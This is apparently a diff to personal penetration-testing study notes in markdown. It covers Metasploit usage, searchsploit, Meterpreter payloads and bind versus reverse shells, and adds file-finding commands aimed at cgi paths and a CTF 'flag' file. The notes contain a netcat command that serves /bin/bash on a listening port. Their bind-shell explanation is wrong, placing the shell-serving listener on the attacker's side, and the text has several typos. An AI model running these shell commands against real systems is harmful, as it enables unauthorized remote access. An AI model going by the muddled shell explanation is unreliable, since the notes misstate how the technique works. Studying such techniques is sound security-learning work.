@@ -717,6 +717,11 @@ You can search by the name of the modules for example after metasploit is loaded
 - `show targets`
 - `run`
 
+- finding stuff: `find -d -iname *cgi*` , `find -d -iname cgi-bin` , `find . -iname flag`
+
+
+
+
 - Once you are able to connect. The next step is sending the malware script 
 
 
@@ -725,6 +730,7 @@ You can search by the name of the modules for example after metasploit is loaded
 - Once you are able to break into a victim machine (with exploits you found with search sploit) you can run **Meterpreter** on the target or transfer `payloads`. The goal of the paylod is to establish a shell which intern can be **bind shell** - hacker (port) connects to victim (listener) or **reverse shell** - victim(port) connects to hacker (listener- these port openings are called **backdoor**. This step can be done without metasploit if we use `Ncat`
 
 After the exploit is successful, 
+
 - **bind sgell**
  -  `nc -lnvp 4444 -e /bin/bash` This command is run on the hacker's computer, sumultaneously you will have to open a port on the victim as well by using `nc <ip address of victim> 4444`
 
